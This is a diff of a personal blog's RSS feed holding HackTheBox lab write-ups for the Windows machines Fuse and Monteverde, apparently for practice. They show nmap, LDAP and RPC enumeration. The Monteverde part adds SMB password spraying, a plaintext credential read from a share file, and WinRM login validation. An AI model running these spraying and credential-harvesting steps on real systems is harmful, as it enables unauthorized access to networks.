@@ -1,1 +1,1156 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Rpcclient on Personal Blog</title><link>https://0x13hrafnulf.github.io/tags/rpcclient/</link><description>Recent content in Rpcclient on Personal Blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Fri, 08 Sep 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://0x13hrafnulf.github.io/tags/rpcclient/index.xml" rel="self" type="application/rss+xml"/><item><title>[HTB] Machine: Fuse</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/fuse/</link><pubDate>Fri, 08 Sep 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/fuse/</guid><description>Fuse Enumeration nmap └─$ nmap -Pn -p- 10.10.10.193 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-09 16:32 BST Nmap scan report for 10.10.10.193 (10.10.10.193) Host is up (0.092s latency). Not shown: 65517 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 49667/tcp open unknown 49675/tcp open unknown 49676/tcp open unknown 49680/tcp open unknown 49698/tcp open unknown └─$ nmap -Pn -p53,80,88,135,139,445,464,593,636,3268,3269,5985 -sC -sV 10.</description></item><item><title>[HTB] Machine: Monteverde</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/monteverde/</link><pubDate>Fri, 01 Sep 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/monteverde/</guid><description>Monteverde Enumeration nmap └─$ nmap -Pn -p- 10.10.10.172 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-02 17:02 BST Nmap scan report for 10.10.10.172 (10.10.10.172) Host is up (0.095s latency). Not shown: 65518 filtered tcp ports (no-response) PORT STATE SERVICE 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 49667/tcp open unknown 49673/tcp open unknown 49674/tcp open unknown 49676/tcp open unknown 49697/tcp open unknown 54886/tcp open unknown └─$ nmap -Pn -p88,135,139,389,464,593,636,3268,3269,5985,9389 -sC -sV 10.</description></item><item><title>[HTB] Machine: Resolute</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/resolute/</link><pubDate>Fri, 01 Sep 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/resolute/</guid><description>Resolute Enumeration nmap └─$ nmap -Pn -p- 10.10.10.169 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-04 16:49 BST Stats: 0:02:44 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 30.27% done; ETC: 16:58 (0:06:20 remaining) Nmap scan report for 10.10.10.169 (10.10.10.169) Host is up (0.16s latency). Not shown: 65511 closed tcp ports (conn-refused) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49671/tcp open unknown 49678/tcp open unknown 49679/tcp open unknown 49684/tcp open unknown 49717/tcp open unknown 50287/tcp open unknown └─$ nmap -Pn -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV 10.</description></item><item><title>[HTB] Machine: Search</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/search/</link><pubDate>Fri, 01 Sep 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/search/</guid><description>Search Enumeration nmap └─$ nmap -Pn -p- 10.10.11.129 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-23 21:42 BST Warning: 10.10.11.129 giving up on port because retransmission cap hit (6). Nmap scan report for 10.10.11.129 (10.10.11.129) Host is up (0.10s latency). Not shown: 65514 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 443/tcp open https 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 8172/tcp open unknown 9389/tcp open adws 49667/tcp open unknown 49675/tcp open unknown 49676/tcp open unknown 49702/tcp open unknown 49712/tcp open unknown 49733/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 1222.</description></item><item><title>[HTB] Machine: Forest</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/forest/</link><pubDate>Sat, 24 Jun 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/forest/</guid><description>Forest Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.161 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-26 16:32 BST Nmap scan report for 10.10.10.161 (10.10.10.161) Host is up (0.15s latency). Not shown: 989 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-06-26 15:39:16Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.</description></item><item><title>[HTB] Machine: Heist</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/heist/</link><pubDate>Fri, 23 Jun 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/heist/</guid><description>Heist Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.149 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-24 10:40 BST Nmap scan report for 10.10.10.149 (10.10.10.149) Host is up (0.10s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-title: Support Login Page |_Requested resource was login.php | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set | http-methods: |_ Potentially risky methods: TRACE 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds?</description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Rpcclient on Personal Blog</title><link>https://0x13hrafnulf.github.io/tags/rpcclient/</link><description>Recent content in Rpcclient on Personal Blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Fri, 08 Sep 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://0x13hrafnulf.github.io/tags/rpcclient/index.xml" rel="self" type="application/rss+xml"/><item><title>[HTB] Machine: Fuse</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/fuse/</link><pubDate>Fri, 08 Sep 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/fuse/</guid><description>&lt;h1 id="fuse">Fuse&lt;/h1>
+&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;ul>
+&lt;li>&lt;code>nmap&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p- 10.10.10.193 -T4
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-09 16:32 BST
+Nmap scan report for 10.10.10.193 (10.10.10.193)
+Host is up (0.092s latency).
+Not shown: 65517 filtered tcp ports (no-response)
+PORT STATE SERVICE
+53/tcp open domain
+80/tcp open http
+88/tcp open kerberos-sec
+135/tcp open msrpc
+139/tcp open netbios-ssn
+389/tcp open ldap
+445/tcp open microsoft-ds
+464/tcp open kpasswd5
+593/tcp open http-rpc-epmap
+636/tcp open ldapssl
+3268/tcp open globalcatLDAP
+3269/tcp open globalcatLDAPssl
+5985/tcp open wsman
+49667/tcp open unknown
+49675/tcp open unknown
+49676/tcp open unknown
+49680/tcp open unknown
+49698/tcp open unknown
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p53,80,88,135,139,445,464,593,636,3268,3269,5985 -sC -sV 10.10.10.193 -T4
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-09 17:23 BST
+Nmap scan report for 10.10.10.193 (10.10.10.193)
+Host is up (0.16s latency).
+PORT STATE SERVICE VERSION
+53/tcp open domain Simple DNS Plus
+80/tcp open http Microsoft IIS httpd 10.0
+|_http-title: Site doesn&amp;#39;t have a title (text/html).
+| http-methods:
+|_ Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-09-09 16:35:34Z)
+135/tcp open msrpc Microsoft Windows RPC
+139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+445/tcp open ��7a)V Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)
+464/tcp open kpasswd5?
+593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
+636/tcp open tcpwrapped
+3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
+3269/tcp open tcpwrapped
+5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+| smb2-time:
+| date: 2023-09-09T16:35:42
+|_ start_date: 2023-09-09T15:42:29
+|_clock-skew: mean: 2h32m23s, deviation: 4h02m30s, median: 12m22s
+| smb2-security-mode:
+| 3:1:1:
+|_ Message signing enabled and required
+| smb-security-mode:
+| account_used: &amp;lt;blank&amp;gt;
+| authentication_level: user
+| challenge_response: supported
+|_ message_signing: required
+| smb-os-discovery:
+| OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+| Computer name: Fuse
+| NetBIOS computer name: FUSE\x00
+| Domain name: fabricorp.local
+| Forest name: fabricorp.local
+| FQDN: Fuse.fabricorp.local
+|_ System time: 2023-09-09T09:35:41-07:00
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>smb&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ smbclient -N -L //10.10.10.193
+Anonymous login successful
+Sharename Type Comment
+--------- ---- -------
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.10.193 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>ldapsearch&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ ldapsearch -H ldap://10.10.10.193 -x -s base namingcontexts
+# extended LDIF
+#
+# LDAPv3
+# base &amp;lt;&amp;gt; (default) with scope baseObject
+# filter: (objectclass=*)
+# requesting: namingcontexts
+#
+#
+dn:
+namingContexts: DC=fabricorp,DC=local
+namingContexts: CN=Configuration,DC=fabricorp,DC=local
+namingContexts: CN=Schema,CN=Configuration,DC=fabricorp,DC=local
+namingContexts: DC=DomainDnsZones,DC=fabricorp,DC=local
+namingContexts: DC=ForestDnsZones,DC=fabricorp,DC=local
+# search result
+search: 2
+result: 0 Success
+# numResponses: 2
+# numEntries: 1
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ ldapsearch -H ldap://10.10.10.193 -x -b &amp;#34;DC=fabricorp,DC=local&amp;#34;
+# extended LDIF
+#
+# LDAPv3
+# base &amp;lt;DC=fabricorp,DC=local&amp;gt; with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+# search result
+search: 2
+result: 1 Operations error
+text: 000004DC: LdapErr: DSID-0C090A6C, comment: In order to perform this opera
+tion a successful bind must be completed on the connection., data 0, v3839
+# numResponses: 1
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>rpc&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ rpcclient -U &amp;#34;&amp;#34; -N 10.10.10.193
+rpcclient $&amp;gt; querydispinfo
+result was NT_STATUS_ACCESS_DENIED
+rpcclient $&amp;gt; enumdomusers
+result was NT_STATUS_ACCESS_DENIED
+rpcclient $&amp;gt;
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Web Server&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/fuse/images/1.png">&lt;/p></description></item><item><title>[HTB] Machine: Monteverde</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/monteverde/</link><pubDate>Fri, 01 Sep 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/monteverde/</guid><description>&lt;h1 id="monteverde">Monteverde&lt;/h1>
+&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;ul>
+&lt;li>&lt;code>nmap&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p- 10.10.10.172 -T4
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-02 17:02 BST
+Nmap scan report for 10.10.10.172 (10.10.10.172)
+Host is up (0.095s latency).
+Not shown: 65518 filtered tcp ports (no-response)
+PORT STATE SERVICE
+88/tcp open kerberos-sec
+135/tcp open msrpc
+139/tcp open netbios-ssn
+389/tcp open ldap
+464/tcp open kpasswd5
+593/tcp open http-rpc-epmap
+636/tcp open ldapssl
+3268/tcp open globalcatLDAP
+3269/tcp open globalcatLDAPssl
+5985/tcp open wsman
+9389/tcp open adws
+49667/tcp open unknown
+49673/tcp open unknown
+49674/tcp open unknown
+49676/tcp open unknown
+49697/tcp open unknown
+54886/tcp open unknown
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p88,135,139,389,464,593,636,3268,3269,5985,9389 -sC -sV 10.10.10.172 -T4
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-02 17:38 BST
+Nmap scan report for 10.10.10.172 (10.10.10.172)
+Host is up (0.16s latency).
+PORT STATE SERVICE VERSION
+88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-09-02 16:37:49Z)
+135/tcp open msrpc Microsoft Windows RPC
+139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
+464/tcp open kpasswd5?
+593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
+636/tcp open tcpwrapped
+3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
+3269/tcp open tcpwrapped
+5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp open mc-nmf .NET Message Framing
+Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+|_smb2-security-mode: SMB: Couldn&amp;#39;t find a NetBIOS name that works for the server. Sorry!
+|_smb2-time: ERROR: Script execution failed (use -d to debug)
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>smb&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>ldap&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ ldapsearch -H ldap://10.10.10.172 -x -s base namingcontexts
+# extended LDIF
+#
+# LDAPv3
+# base &amp;lt;&amp;gt; (default) with scope baseObject
+# filter: (objectclass=*)
+# requesting: namingcontexts
+#
+#
+dn:
+namingcontexts: DC=MEGABANK,DC=LOCAL
+namingcontexts: CN=Configuration,DC=MEGABANK,DC=LOCAL
+namingcontexts: CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
+namingcontexts: DC=DomainDnsZones,DC=MEGABANK,DC=LOCAL
+namingcontexts: DC=ForestDnsZones,DC=MEGABANK,DC=LOCAL
+# search result
+search: 2
+result: 0 Success
+# numResponses: 2
+# numEntries: 1
+&lt;/code>&lt;/pre>&lt;h2 id="foothold">Foothold&lt;/h2>
+&lt;ul>
+&lt;li>Will dump everything &lt;code>ldapsearch -H ldap://10.10.10.172 -x -b &amp;quot;DC=MEGABANK,DC=LOCAL&amp;quot;&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ ldapsearch -H ldap://10.10.10.172 -x -b &amp;#34;DC=MEGABANK,DC=LOCAL&amp;#34;
+# extended LDIF
+#
+# LDAPv3
+# base &amp;lt;DC=MEGABANK,DC=LOCAL&amp;gt; with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+# MEGABANK.LOCAL
+dn: DC=MEGABANK,DC=LOCAL
+objectClass: top
+objectClass: domain
+objectClass: domainDNS
+distinguishedName: DC=MEGABANK,DC=LOCAL
+instanceType: 5
+whenCreated: 20200102220515.0Z
+whenChanged: 20230902160106.0Z
+subRefs: DC=ForestDnsZones,DC=MEGABANK,DC=LOCAL
+subRefs: DC=DomainDnsZones,DC=MEGABANK,DC=LOCAL
+subRefs: CN=Configuration,DC=MEGABANK,DC=LOCAL
+uSNCreated: 4099
+dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAD3ugOsMvMU+GSt3sotNcxQ==
+uSNChanged: 77851
+name: MEGABANK
+objectGUID:: dF0ZQW9mmEa6eGdQmEH00A==
+replUpToDateVector:: AgAAAAAAAAALAAAAAAAAAA97oDrDLzFPhkrd7KLTXMUFcAAAAAAAAHgMH
+xQDAAAAR5FJQrVN102DFng19yhewBEwAQAAAAAAQO0DGwMAAAAwI/VDJY7GTL9LbBrQc6myECABAA
+AAAABJ0GoZAwAAADOghEir6oNEsvEJ9u8wjngKwAAAAAAAALHzHxQDAAAATEU0VTJDIUOpC+muz1W
+GHAzgAAAAAAAAFc0jFAMAAABlUzJYUqlcQa1wRtRT7+pYCbAAAAAAAAAH5x8UAwAAAF7963Yf1ZpM
+jnEppodbjcsOAAEAAAAAAE3OshYDAAAAhz8WkG49/0eslA/vS3oKjgeQAAAAAAAA5BYfFAMAAAAPn
+/fkzuNaRKsJOojPyQTJBoAAAAAAAAA5Ex8UAwAAAKdfSfADqmJLvDeHFzYjcqcL0AAAAAAAALqZIx
+QDAAAASULD+GgHQU+OAWPs7IQ4IQ8QAQAAAAAAYz1oGQMAAAA=
+creationTime: 133381440661787842
+forceLogoff: -9223372036854775808
+lockoutDuration: -18000000000
+lockOutObservationWindow: -18000000000
+lockoutThreshold: 0
+maxPwdAge: -36288000000000
+minPwdAge: -864000000000
+minPwdLength: 7
+modifiedCountAtLastProm: 0
+...
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>We can also use &lt;code>rpcclient&lt;/code>
+&lt;ul>
+&lt;li>&lt;a href="https://www.hackingarticles.in/active-directory-enumeration-rpcclient/" target="_blank" rel="noopener">https://www.hackingarticles.in/active-directory-enumeration-rpcclient/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration" target="_blank" rel="noopener">https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration&lt;/a>&lt;/li>
+&lt;li>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ rpcclient -U &amp;#34;&amp;#34; -N 10.10.10.172
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>rpcclient $&amp;gt; enumdomusers
+user:[Guest] rid:[0x1f5]
+user:[AAD_987d7f2f57d2] rid:[0x450]
+user:[mhope] rid:[0x641]
+user:[SABatchJobs] rid:[0xa2a]
+user:[svc-ata] rid:[0xa2b]
+user:[svc-bexec] rid:[0xa2c]
+user:[svc-netapp] rid:[0xa2d]
+user:[dgalanos] rid:[0xa35]
+user:[roleary] rid:[0xa36]
+user:[smorgan] rid:[0xa37]
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>rpcclient $&amp;gt; querydispinfo
+index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2 Name: AAD_987d7f2f57d2 Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
+index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos Name: Dimitris Galanos Desc: (null)
+index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest Name: (null) Desc: Built-in account for guest access to the computer/domain
+index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope Name: Mike Hope Desc: (null)
+index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary Name: Ray O&amp;#39;Leary Desc: (null)
+index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs Name: SABatchJobs Desc: (null)
+index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan Name: Sally Morgan Desc: (null)
+index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata Name: svc-ata Desc: (null)
+index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec Name: svc-bexec Desc: (null)
+index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp Name: svc-netapp Desc: (null)
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>No more information we could retrieve
+&lt;ul>
+&lt;li>So we might try password spraying using &lt;code>crackmapexec&lt;/code>&lt;/li>
+&lt;li>First, we will try using usernames as passwords
+&lt;ul>
+&lt;li>Then we might need to create different password list using names combinations
+&lt;ul>
+&lt;li>&lt;a href="https://github.com/digininja/CeWL" target="_blank" rel="noopener">CeWL&lt;/a>&lt;/li>
+&lt;li>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ crackmapexec smb 10.10.10.172 -u users.list -p users.list
+SMB 10.10.10.172 445 MONTEVERDE [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
+SMB 10.10.10.172 445 MONTEVERDE [-] MEGABANK.LOCAL\mhope:mhope STATUS_LOGON_FAILURE
+SMB 10.10.10.172 445 MONTEVERDE [-] MEGABANK.LOCAL\mhope:SABatchJobs STATUS_LOGON_FAILURE
+SMB 10.10.10.172 445 MONTEVERDE [-] MEGABANK.LOCAL\mhope:svc-ata STATUS_LOGON_FAILURE
+SMB 10.10.10.172 445 MONTEVERDE [-] MEGABANK.LOCAL\mhope:svc-bexec STATUS_LOGON_FAILURE
+SMB 10.10.10.172 445 MONTEVERDE [-] MEGABANK.LOCAL\mhope:svc-netapp STATUS_LOGON_FAILURE
+SMB 10.10.10.172 445 MONTEVERDE [-] MEGABANK.LOCAL\mhope:dgalanos STATUS_LOGON_FAILURE
+SMB 10.10.10.172 445 MONTEVERDE [-] MEGABANK.LOCAL\mhope:roleary STATUS_LOGON_FAILURE
+SMB 10.10.10.172 445 MONTEVERDE [-] MEGABANK.LOCAL\mhope:smorgan STATUS_LOGON_FAILURE
+SMB 10.10.10.172 445 MONTEVERDE [-] MEGABANK.LOCAL\SABatchJobs:mhope STATUS_LOGON_FAILURE
+SMB 10.10.10.172 445 MONTEVERDE [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Now let&amp;rsquo;s enumerate &lt;code>smb&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs
+[+] IP: 10.10.10.172:445 Name: 10.10.10.172
+Disk Permissions Comment
+---- ----------- -------
+ADMIN$ NO ACCESS Remote Admin
+azure_uploads READ ONLY
+C$ NO ACCESS Default share
+E$ NO ACCESS Default share
+IPC$ READ ONLY Remote IPC
+NETLOGON READ ONLY Logon server share
+SYSVOL READ ONLY Logon server share
+users$ READ ONLY
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs -R users$
+[+] IP: 10.10.10.172:445 Name: 10.10.10.172
+Disk Permissions Comment
+---- ----------- -------
+users$ READ ONLY
+.\users$\*
+dr--r--r-- 0 Fri Jan 3 13:12:48 2020 .
+dr--r--r-- 0 Fri Jan 3 13:12:48 2020 ..
+dr--r--r-- 0 Fri Jan 3 13:15:23 2020 dgalanos
+dr--r--r-- 0 Fri Jan 3 13:41:18 2020 mhope
+dr--r--r-- 0 Fri Jan 3 13:14:56 2020 roleary
+dr--r--r-- 0 Fri Jan 3 13:14:28 2020 smorgan
+.\users$\mhope\*
+dr--r--r-- 0 Fri Jan 3 13:41:18 2020 .
+dr--r--r-- 0 Fri Jan 3 13:41:18 2020 ..
+fw--w--w-- 1212 Fri Jan 3 14:59:24 2020 azure.xml
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Let&amp;rsquo;s get &lt;code>azure.xml&lt;/code> from &lt;code>mhope&lt;/code>&amp;rsquo;s directory&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ smbclient -U SABatchJobs //10.10.10.172/users$ --password &amp;#39;SABatchJobs&amp;#39;
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>azure.xml&lt;/code>
+&lt;ul>
+&lt;li>Looks like we have a password&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ cat azure.xml
+��&amp;lt;Objs Version=&amp;#34;1.1.0.1&amp;#34; xmlns=&amp;#34;http://schemas.microsoft.com/powershell/2004/04&amp;#34;&amp;gt;
+&amp;lt;Obj RefId=&amp;#34;0&amp;#34;&amp;gt;
+&amp;lt;TN RefId=&amp;#34;0&amp;#34;&amp;gt;
+&amp;lt;T&amp;gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&amp;lt;/T&amp;gt;
+&amp;lt;T&amp;gt;System.Object&amp;lt;/T&amp;gt;
+&amp;lt;/TN&amp;gt;
+&amp;lt;ToString&amp;gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&amp;lt;/ToString&amp;gt;
+&amp;lt;Props&amp;gt;
+&amp;lt;DT N=&amp;#34;StartDate&amp;#34;&amp;gt;2020-01-03T05:35:00.7562298-08:00&amp;lt;/DT&amp;gt;
+&amp;lt;DT N=&amp;#34;EndDate&amp;#34;&amp;gt;2054-01-03T05:35:00.7562298-08:00&amp;lt;/DT&amp;gt;
+&amp;lt;G N=&amp;#34;KeyId&amp;#34;&amp;gt;00000000-0000-0000-0000-000000000000&amp;lt;/G&amp;gt;
+&amp;lt;S N=&amp;#34;Password&amp;#34;&amp;gt;4n0therD4y@n0th3r$&amp;lt;/S&amp;gt;
+&amp;lt;/Props&amp;gt;
+&amp;lt;/Obj&amp;gt;
+&amp;lt;/Objs&amp;gt;
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Let&amp;rsquo;s check it via &lt;code>crackmapexec&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ crackmapexec smb 10.10.10.172 -u mhope -p &amp;#39;4n0therD4y@n0th3r$&amp;#39;
+SMB 10.10.10.172 445 MONTEVERDE [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
+SMB 10.10.10.172 445 MONTEVERDE [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ crackmapexec winrm 10.10.10.172 -u mhope -p &amp;#39;4n0therD4y@n0th3r$&amp;#39;
+SMB 10.10.10.172 5985 MONTEVERDE [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
+HTTP 10.10.10.172 5985 MONTEVERDE [*] http://10.10.10.172:5985/wsman
+WINRM 10.10.10.172 5985 MONTEVERDE [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ (Pwn3d!)
+&lt;/code>&lt;/pre>&lt;ul>
